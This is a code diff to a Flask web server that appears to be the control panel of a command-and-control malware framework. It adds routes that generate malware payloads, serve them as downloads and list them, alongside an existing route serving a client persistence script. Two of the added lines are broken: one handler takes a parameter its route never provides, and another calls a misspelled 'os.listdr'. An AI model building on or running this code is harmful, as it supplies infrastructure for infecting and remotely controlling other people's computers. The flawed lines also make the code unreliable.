@@ -2,6 +2,7 @@ from flask import Flask, render_template, request, redirect, send_from_directory
 import eventlet
 import socketio
 from c2 import C2
+import os
 
 app = Flask(__name__)
 sio = socketio.Server(cors_allowed_origins='*', logger=False)
@@ -48,9 +49,10 @@ def client_data():
 def persistence():
     return render_template("client/persistence.py")
 
-@app.route('/win')
-def win11():
-    return send_from_directory('templates/executables', 'windows.exe')
+@app.route('/get_payloads<path:filename>')
+def get_payloads(filename):
+    return send_from_directory('payloads', filename, as_attachment=True)
+
 
 
 
@@ -75,6 +77,16 @@ def payload1():
     data = request.get_json()
     malware.payload(data)
     return ""
+
+@app.route('/download', methods=['POST'])
+def download1():
+    data = request.get_json()
+    malware.generate(data)
+    return ""
+
+@app.route('/list_payloads', methods=['POST'])
+def list_payloads(filename):
+    return os.listdr('payloads')
 
 if __name__ == "__main__":
     flaskApp = socketio.Middleware(sio, app)
